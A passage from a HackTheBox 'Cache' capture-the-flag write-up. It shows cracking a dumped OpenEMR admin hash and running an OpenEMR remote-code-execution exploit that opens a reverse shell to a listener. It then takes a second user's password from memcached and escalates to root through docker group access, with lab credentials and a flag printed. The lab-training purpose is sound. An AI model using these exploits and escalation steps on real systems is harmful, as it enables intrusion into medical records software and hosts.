</span></span><span class=line><span class=cl>| openemr_admin   | NoLongerUsed |
</span></span><span class=line><span class=cl>| phimail-service | NoLogin      |
</span></span><span class=line><span class=cl>| portal-user     | NoLogin      |
</span></span><span class=line><span class=cl>+-----------------+--------------+
</span></span></code></pre></td></tr></table></div></div><p>It seems not to be the right table, lets&rsquo; try this one instead.</p><p><code>-D openemr -T users_secure -C username,password --dump</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Database: openemr
</span></span><span class=line><span class=cl>Table: users_secure
</span></span><span class=line><span class=cl>[1 entry]
</span></span><span class=line><span class=cl>+---------------+--------------------------------------------------------------+
</span></span><span class=line><span class=cl>| username      | password                                                     |
</span></span><span class=line><span class=cl>+---------------+--------------------------------------------------------------+
</span></span><span class=line><span class=cl>| openemr_admin | $2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B. |
</span></span><span class=line><span class=cl>+---------------+--------------------------------------------------------------+
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s put the hash in a file to crack it with [JtR][JtR]:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>printf</span> <span class=o>%</span><span class=n>s</span> <span class=s1>&#39;$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.&#39;</span> <span class=o>&gt;</span> <span class=nb>hash</span><span class=o>.</span><span class=n>txt</span>
</span></span><span class=line><span class=cl><span class=o>$</span> <span class=n>john</span> <span class=o>-</span><span class=n>w</span> <span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>share</span><span class=o>/</span><span class=n>wordlists</span><span class=o>/</span><span class=n>password</span><span class=o>/</span><span class=n>rockyou</span><span class=o>.</span><span class=n>txt</span> <span class=o>--</span><span class=n>format</span><span class=o>=</span><span class=n>bcrypt</span> <span class=nb>hash</span><span class=o>.</span><span class=n>txt</span>
</span></span><span class=line><span class=cl><span class=n>Warning</span><span class=p>:</span> <span class=n>invalid</span> <span class=n>UTF</span><span class=o>-</span><span class=mi>8</span> <span class=n>seen</span> <span class=n>reading</span> <span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>share</span><span class=o>/</span><span class=n>wordlists</span><span class=o>/</span><span class=n>password</span><span class=o>/</span><span class=n>rockyou</span><span class=o>.</span><span class=n>txt</span>
</span></span><span class=line><span class=cl><span class=n>Using</span> <span class=n>default</span> <span class=n>input</span> <span class=n>encoding</span><span class=p>:</span> <span class=n>UTF</span><span class=o>-</span><span class=mi>8</span>
</span></span><span class=line><span class=cl><span class=n>Loaded</span> <span class=mi>1</span> <span class=n>password</span> <span class=nb>hash</span> <span class=p>(</span><span class=n>bcrypt</span> <span class=p>[</span><span class=n>Blowfish</span> <span class=mi>32</span><span class=o>/</span><span class=mi>64</span> <span class=n>X3</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>Cost</span> <span class=mi>1</span> <span class=p>(</span><span class=n>iteration</span> <span class=n>count</span><span class=p>)</span> <span class=n>is</span> <span class=mi>32</span> <span class=k>for</span> <span class=n>all</span> <span class=n>loaded</span> <span class=n>hashes</span>
</span></span><span class=line><span class=cl><span class=n>Will</span> <span class=n>run</span> <span class=mi>2</span> <span class=n>OpenMP</span> <span class=n>threads</span>
</span></span><span class=line><span class=cl><span class=n>Press</span> <span class=s1>&#39;q&#39;</span> <span class=ow>or</span> <span class=n>Ctrl</span><span class=o>-</span><span class=n>C</span> <span class=n>to</span> <span class=n>abort</span><span class=p>,</span> <span class=n>almost</span> <span class=n>any</span> <span class=n>other</span> <span class=n>key</span> <span class=k>for</span> <span class=n>status</span>
</span></span><span class=line><span class=cl><span class=n>xxxxxx</span>           <span class=p>(</span><span class=err>?</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=mi>1</span><span class=n>g</span> <span class=mi>0</span><span class=p>:</span><span class=mi>00</span><span class=p>:</span><span class=mi>00</span><span class=p>:</span><span class=mi>01</span> <span class=n>DONE</span> <span class=p>(</span><span class=mi>2020</span><span class=o>-</span><span class=mi>07</span><span class=o>-</span><span class=mi>15</span> <span class=mi>00</span><span class=p>:</span><span class=mi>51</span><span class=p>)</span> <span class=mf>0.6369</span><span class=n>g</span><span class=o>/</span><span class=n>s</span> <span class=mf>722.2</span><span class=n>p</span><span class=o>/</span><span class=n>s</span> <span class=mf>722.2</span><span class=n>c</span><span class=o>/</span><span class=n>s</span> <span class=mf>722.2</span><span class=n>C</span><span class=o>/</span><span class=n>s</span> <span class=n>water</span><span class=o>..</span><span class=n>zombie</span>
</span></span><span class=line><span class=cl><span class=n>Use</span> <span class=n>the</span> <span class=s2>&#34;--show&#34;</span> <span class=n>option</span> <span class=n>to</span> <span class=n>display</span> <span class=n>all</span> <span class=n>of</span> <span class=n>the</span> <span class=n>cracked</span> <span class=n>passwords</span> <span class=n>reliably</span>
</span></span><span class=line><span class=cl><span class=n>Session</span> <span class=n>completed</span>
</span></span><span class=line><span class=cl><span class=o>$</span> <span class=n>john</span> <span class=o>--</span><span class=n>show</span> <span class=nb>hash</span><span class=o>.</span><span class=n>txt</span>
</span></span><span class=line><span class=cl><span class=err>?</span><span class=p>:</span><span class=n>xxxxxx</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=mi>1</span> <span class=n>password</span> <span class=nb>hash</span> <span class=n>cracked</span><span class=p>,</span> <span class=mi>0</span> <span class=n>left</span>
</span></span></code></pre></td></tr></table></div></div><p>Now we have some creds: <code>openemr_admin</code> / <code>xxxxxx</code>.</p><h3 id=http-exploitation-openemr-rce>HTTP exploitation (OpenEMR): RCE<a hidden class=anchor aria-hidden=true href=#http-exploitation-openemr-rce>#</a></h3><p>Now we will be able to use the authenticated RCE we found earlier.</p><p><strong>Warning</strong>: Using EDB-48515 that has a neutral impact rather than EDB-45161 that
will reset the config to default for everyone!!!</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ searchsploit -m 48515
</span></span><span class=line><span class=cl>  Exploit: OpenEMR 5.0.1 - Remote Code Execution
</span></span><span class=line><span class=cl>      URL: https://www.exploit-db.com/exploits/48515
</span></span><span class=line><span class=cl>     Path: /usr/share/exploitdb/exploits/php/webapps/48515.py
</span></span><span class=line><span class=cl>File Type: ASCII text, with CRLF line terminators
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Copied to: /home/cyfun/CTF/HackTheBox/machines/Cache/48515.py
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s modify, the remote URL, the LHOST, LPORT, and admin creds.</p><p>Then start a listener & start the exploit:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>pwncat</span> <span class=o>-</span><span class=n>l</span> <span class=mi>8888</span> <span class=o>-</span><span class=n>vv</span>
</span></span><span class=line><span class=cl><span class=n>INFO</span><span class=p>:</span> <span class=n>Listening</span> <span class=n>on</span> <span class=p>:::</span><span class=mi>8888</span> <span class=p>(</span><span class=n>family</span> <span class=mi>10</span><span class=o>/</span><span class=n>IPv6</span><span class=p>,</span> <span class=n>TCP</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>INFO</span><span class=p>:</span> <span class=n>Listening</span> <span class=n>on</span> <span class=mf>0.0</span><span class=o>.</span><span class=mf>0.0</span><span class=p>:</span><span class=mi>8888</span> <span class=p>(</span><span class=n>family</span> <span class=mi>2</span><span class=o>/</span><span class=n>IPv4</span><span class=p>,</span> <span class=n>TCP</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>INFO</span><span class=p>:</span> <span class=n>Client</span> <span class=n>connected</span> <span class=n>from</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.188</span><span class=p>:</span><span class=mi>32838</span> <span class=p>(</span><span class=n>family</span> <span class=mi>2</span><span class=o>/</span><span class=n>IPv4</span><span class=p>,</span> <span class=n>TCP</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>Linux</span> <span class=n>cache</span> <span class=mf>4.15</span><span class=o>.</span><span class=mi>0</span><span class=o>-</span><span class=mi>109</span><span class=o>-</span><span class=n>generic</span> <span class=c1>#110-Ubuntu SMP Tue Jun 23 02:39:32 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span>
</span></span><span class=line><span class=cl> <span class=mi>23</span><span class=p>:</span><span class=mi>11</span><span class=p>:</span><span class=mi>40</span> <span class=n>up</span> <span class=mi>32</span> <span class=nb>min</span><span class=p>,</span>  <span class=mi>0</span> <span class=n>users</span><span class=p>,</span>  <span class=nb>load</span> <span class=n>average</span><span class=p>:</span> <span class=mf>0.07</span><span class=p>,</span> <span class=mf>0.02</span><span class=p>,</span> <span class=mf>0.03</span>
</span></span><span class=line><span class=cl><span class=n>USER</span>     <span class=n>TTY</span>      <span class=n>FROM</span>             <span class=n>LOGIN</span><span class=err>@</span>   <span class=n>IDLE</span>   <span class=n>JCPU</span>   <span class=n>PCPU</span> <span class=n>WHAT</span>
</span></span><span class=line><span class=cl><span class=n>uid</span><span class=o>=</span><span class=mi>33</span><span class=p>(</span><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=p>)</span> <span class=n>gid</span><span class=o>=</span><span class=mi>33</span><span class=p>(</span><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=p>)</span> <span class=n>groups</span><span class=o>=</span><span class=mi>33</span><span class=p>(</span><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>sh</span><span class=p>:</span> <span class=mi>0</span><span class=p>:</span> <span class=n>can</span><span class=s1>&#39;t access tty; job control turned off</span>
</span></span><span class=line><span class=cl><span class=o>$</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>$</span> <span class=n>python2</span> <span class=mf>48515.</span><span class=n>py</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Authentication</span> <span class=n>with</span> <span class=n>credentials</span> <span class=n>provided</span> <span class=n>please</span> <span class=n>be</span> <span class=n>patient</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Uploading</span> <span class=n>a</span> <span class=n>payload</span> <span class=n>it</span> <span class=n>will</span> <span class=n>take</span> <span class=n>a</span> <span class=n>minute</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>You</span> <span class=n>should</span> <span class=n>be</span> <span class=n>getting</span> <span class=n>a</span> <span class=n>shell</span>
</span></span></code></pre></td></tr></table></div></div><p>Afterward I created my own exploit for OpenEMR RCE: <a href=https://github.com/cyfun/OpenEMR-RCE>https://github.com/cyfun/OpenEMR-RCE</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ ruby OpenEMR-RCE/exploit.rb auto -r http://hms.htb -u openemr_admin -p xxxxxx -h 10.10.15.201 -t 8888
</span></span><span class=line><span class=cl>$ ruby OpenEMR-RCE/exploit.rb semi-auto -r http://hms.htb -u openemr_admin -p xxxxxx -h 10.10.15.201 -t 8888 -m &#39;php/reverse_php&#39;
</span></span><span class=line><span class=cl>$ ruby OpenEMR-RCE/exploit.rb manual -r http://hms.htb -u openemr_admin -p xxxxxx -s tmp548.php
</span></span></code></pre></td></tr></table></div></div><h3 id=privilege-escalation-of-machine--www-data-to-ash>Privilege Escalation of Machine : www-data to ash<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine--www-data-to-ash>#</a></h3><p>We can use the credentials (<code>ash</code> / <code>H@v3_fun</code>) we found at the beginning.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ which python3
</span></span><span class=line><span class=cl>/usr/bin/python3
</span></span><span class=line><span class=cl>$ python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
</span></span><span class=line><span class=cl>www-data@cache:/$ su ash
</span></span><span class=line><span class=cl>su ash
</span></span><span class=line><span class=cl>Password: H@v3_fun
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>ash@cache:/$ cd
</span></span><span class=line><span class=cl>cd
</span></span><span class=line><span class=cl>ash@cache:~$ cat user.txt
</span></span><span class=line><span class=cl>cat user.txt
</span></span><span class=line><span class=cl>aebbdcd5e2a33812b7db84f42f124ea5
</span></span></code></pre></td></tr></table></div></div><p>But this is totally optional it&rsquo;s possible to jump over this step and directly
elevate to user luffy from www-data.</p><h3 id=privilege-escalation-of-machine--ash-to-luffy>Privilege Escalation of Machine : ash to luffy<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine--ash-to-luffy>#</a></h3><p>Let&rsquo;s see open TCP sockets:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ ss -nlpt
</span></span><span class=line><span class=cl>State    Recv-Q    Send-Q        Local Address:Port        Peer Address:Port
</span></span><span class=line><span class=cl>LISTEN   0         128           127.0.0.53%lo:53               0.0.0.0:*
</span></span><span class=line><span class=cl>LISTEN   0         128                 0.0.0.0:22               0.0.0.0:*
</span></span><span class=line><span class=cl>LISTEN   0         80                127.0.0.1:3306             0.0.0.0:*
</span></span><span class=line><span class=cl>LISTEN   0         128               127.0.0.1:11211            0.0.0.0:*
</span></span><span class=line><span class=cl>LISTEN   0         128                    [::]:22                  [::]:*
</span></span><span class=line><span class=cl>LISTEN   0         128                    [::]:11211               [::]:*
</span></span><span class=line><span class=cl>LISTEN   0         128                       *:80                     *:*
</span></span></code></pre></td></tr></table></div></div><p>Ohoh we have port 11211 used by memcached.</p><p>We can confirm the process is running:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>ps</span> <span class=o>-</span><span class=n>ef</span> <span class=n>f</span> <span class=o>|</span> <span class=n>grep</span> <span class=n>memcached</span>
</span></span><span class=line><span class=cl><span class=n>memcache</span>  <span class=mi>1125</span>     <span class=mi>1</span>  <span class=mi>0</span> <span class=mi>22</span><span class=p>:</span><span class=mi>39</span> <span class=err>?</span>        <span class=n>Ssl</span>    <span class=mi>0</span><span class=p>:</span><span class=mi>00</span> <span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>memcached</span> <span class=o>-</span><span class=n>m</span> <span class=mi>64</span> <span class=o>-</span><span class=n>p</span> <span class=mi>11211</span> <span class=o>-</span><span class=n>u</span> <span class=n>memcache</span> <span class=o>-</span><span class=n>l</span> <span class=mf>127.0</span><span class=o>.</span><span class=mf>0.1</span> <span class=o>-</span><span class=n>P</span> <span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>run</span><span class=o>/</span><span class=n>memcached</span><span class=o>/</span><span class=n>memcached</span><span class=o>.</span><span class=n>pid</span>
</span></span><span class=line><span class=cl><span class=n>ash</span>       <span class=mi>6235</span>  <span class=mi>5474</span>  <span class=mi>0</span> <span class=mi>23</span><span class=p>:</span><span class=mi>30</span> <span class=n>pts</span><span class=o>/</span><span class=mi>1</span>    <span class=n>S</span><span class=o>+</span>     <span class=mi>0</span><span class=p>:</span><span class=mi>00</span>  <span class=o>|</span>                           \<span class=n>_</span> <span class=n>grep</span> <span class=o>--</span><span class=n>color</span><span class=o>=</span><span class=n>auto</span> <span class=n>memcached</span>
</span></span><span class=line><span class=cl><span class=n>www</span><span class=o>-</span><span class=n>data</span>  <span class=mi>4693</span>  <span class=mi>4669</span>  <span class=mi>0</span> <span class=mi>23</span><span class=p>:</span><span class=mi>04</span> <span class=err>?</span>        <span class=n>Sl</span>     <span class=mi>0</span><span class=p>:</span><span class=mi>00</span>  <span class=o>|</span>               \<span class=n>_</span> <span class=n>memcached</span>
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s check some advices on <a href=https://book.hacktricks.xyz/>HackTricks</a>: <a href=https://book.hacktricks.xyz/pentesting/11211-memcache>11211 - Pentesting Memcache</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ telnet 127.0.0.1 11211
</span></span><span class=line><span class=cl>telnet 127.0.0.1 11211
</span></span><span class=line><span class=cl>Trying 127.0.0.1...
</span></span><span class=line><span class=cl>Connected to 127.0.0.1.
</span></span><span class=line><span class=cl>Escape character is &#39;^]&#39;.
</span></span><span class=line><span class=cl>version
</span></span><span class=line><span class=cl>version
</span></span><span class=line><span class=cl>VERSION 1.5.6 Ubuntu
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>stats items
</span></span><span class=line><span class=cl>stats items
</span></span><span class=line><span class=cl>STAT items:1:number 5
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>stats cachedump 1 0
</span></span><span class=line><span class=cl>stats cachedump 1 0
</span></span><span class=line><span class=cl>ITEM link [21 b; 0 s]
</span></span><span class=line><span class=cl>ITEM user [5 b; 0 s]
</span></span><span class=line><span class=cl>ITEM passwd [9 b; 0 s]
</span></span><span class=line><span class=cl>ITEM file [7 b; 0 s]
</span></span><span class=line><span class=cl>ITEM account [9 b; 0 s]
</span></span><span class=line><span class=cl>END
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>get user
</span></span><span class=line><span class=cl>get user
</span></span><span class=line><span class=cl>VALUE user 0 5
</span></span><span class=line><span class=cl>luffy
</span></span><span class=line><span class=cl>END
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>get passwd
</span></span><span class=line><span class=cl>get passwd
</span></span><span class=line><span class=cl>VALUE passwd 0 9
</span></span><span class=line><span class=cl>0n3_p1ec3
</span></span><span class=line><span class=cl>END
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>get file
</span></span><span class=line><span class=cl>get file
</span></span><span class=line><span class=cl>VALUE file 0 7
</span></span><span class=line><span class=cl>nothing
</span></span><span class=line><span class=cl>END
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>get account
</span></span><span class=line><span class=cl>get account
</span></span><span class=line><span class=cl>VALUE account 0 9
</span></span><span class=line><span class=cl>afhj556uo
</span></span><span class=line><span class=cl>END
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>quit
</span></span><span class=line><span class=cl>quit
</span></span></code></pre></td></tr></table></div></div><p>Now we can use the creds: <code>luffy</code> / <code>0n3_p1ec3</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ su luffy
</span></span><span class=line><span class=cl>su luffy
</span></span><span class=line><span class=cl>Password: 0n3_p1ec3
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>luffy@cache:/$ cd
</span></span><span class=line><span class=cl>cd
</span></span><span class=line><span class=cl>luffy@cache:~$
</span></span></code></pre></td></tr></table></div></div><h3 id=privilege-escalation-of-machine--luffy-to-root>Privilege Escalation of Machine : luffy to root<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine--luffy-to-root>#</a></h3><p>We can see there is docker running and the user is in docker group.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>id</span>
</span></span><span class=line><span class=cl><span class=n>uid</span><span class=o>=</span><span class=mi>1001</span><span class=p>(</span><span class=n>luffy</span><span class=p>)</span> <span class=n>gid</span><span class=o>=</span><span class=mi>1001</span><span class=p>(</span><span class=n>luffy</span><span class=p>)</span> <span class=n>groups</span><span class=o>=</span><span class=mi>1001</span><span class=p>(</span><span class=n>luffy</span><span class=p>),</span><span class=mi>999</span><span class=p>(</span><span class=n>docker</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=o>$</span> <span class=n>ps</span> <span class=o>-</span><span class=n>ef</span> <span class=n>f</span> <span class=o>|</span> <span class=n>grep</span> <span class=n>docker</span>
</span></span><span class=line><span class=cl><span class=n>ps</span> <span class=o>-</span><span class=n>ef</span> <span class=n>f</span> <span class=o>|</span> <span class=n>grep</span> <span class=n>docker</span>
</span></span><span class=line><span class=cl><span class=n>root</span>       <span class=mi>918</span>     <span class=mi>1</span>  <span class=mi>0</span> <span class=mi>22</span><span class=p>:</span><span class=mi>39</span> <span class=err>?</span>        <span class=n>Ssl</span>    <span class=mi>0</span><span class=p>:</span><span class=mi>05</span> <span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>dockerd</span> <span class=o>-</span><span class=n>H</span> <span class=n>fd</span><span class=p>:</span><span class=o>//</span>
</span></span><span class=line><span class=cl><span class=n>root</span>      <span class=mi>1358</span>   <span class=mi>918</span>  <span class=mi>0</span> <span class=mi>22</span><span class=p>:</span><span class=mi>39</span> <span class=err>?</span>        <span class=n>Ssl</span>    <span class=mi>0</span><span class=p>:</span><span class=mi>04</span>  \<span class=n>_</span> <span class=n>containerd</span> <span class=o>--</span><span class=n>config</span> <span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>run</span><span class=o>/</span><span class=n>docker</span><span class=o>/</span><span class=n>containerd</span><span class=o>/</span><span class=n>containerd</span><span class=o>.</span><span class=n>toml</span> <span class=o>--</span><span class=nb>log</span><span class=o>-</span><span class=n>level</span> <span class=n>info</span>
</span></span><span class=line><span class=cl><span class=n>root</span>      <span class=mi>6934</span>  <span class=mi>1358</span>  <span class=mi>0</span> <span class=mi>23</span><span class=p>:</span><span class=mi>45</span> <span class=err>?</span>        <span class=n>Sl</span>     <span class=mi>0</span><span class=p>:</span><span class=mi>00</span>      \<span class=n>_</span> <span class=n>containerd</span><span class=o>-</span><span class=n>shim</span> <span class=o>-</span><span class=n>namespace</span> <span class=n>moby</span> <span class=o>-</span><span class=n>workdir</span> <span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>docker</span><span class=o>/</span><span class=n>containerd</span><span class=o>/</span><span class=n>daemon</span><span class=o>/</span><span class=n>io</span><span class=o>.</span><span class=n>containerd</span><span class=o>.</span><span class=n>runtime</span><span class=o>.</span><span class=n>v1</span><span class=o>.</span><span class=n>linux</span><span class=o>/</span><span class=n>moby</span><span class=o>/</span><span class=n>f211bc4cffb910b8c45b09d9eeec6c9483af4fff6222a5ca7c211aef6ca3bc94</span> <span class=o>-</span><span class=n>address</span> <span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>run</span><span class=o>/</span><span class=n>docker</span><span class=o>/</span><span class=n>containerd</span><span class=o>/</span><span class=n>containerd</span><span class=o>.</span><span class=n>sock</span> <span class=o>-</span><span class=n>containerd</span><span class=o>-</span><span class=n>binary</span> <span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>containerd</span> <span class=o>-</span><span class=n>runtime</span><span class=o>-</span><span class=n>root</span> <span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>run</span><span class=o>/</span><span class=n>docker</span><span class=o>/</span><span class=n>runtime</span><span class=o>-</span><span class=n>runc</span>
</span></span></code></pre></td></tr></table></div></div><p>Being in docker group is like being root because of the capabilities.</p><p>My reflex is to check <a href=https://gtfobins.github.io/>GTFOBins</a> if there are some ready to use payloads
for pe, and <a href=https://gtfobins.github.io/gtfobins/docker/#shell%3C%3E>there is</a>.</p><p>Let&rsquo;s find what images are available:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ docker images
</span></span><span class=line><span class=cl>docker images
</span></span><span class=line><span class=cl>REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
</span></span><span class=line><span class=cl>ubuntu              latest              2ca708c1c9cc        10 months ago       64.2MB
</span></span></code></pre></td></tr></table></div></div><p>So let&rsquo;s spawn a shell through a shared volume:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>luffy@cache:~$ docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
</span></span><span class=line><span class=cl>docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
</span></span><span class=line><span class=cl>root@ae6411b77a1e:/# cd
</span></span><span class=line><span class=cl>cd
</span></span><span class=line><span class=cl>root@ae6411b77a1e:~# cat root.txt
</span></span><span class=line><span class=cl>cat root.txt
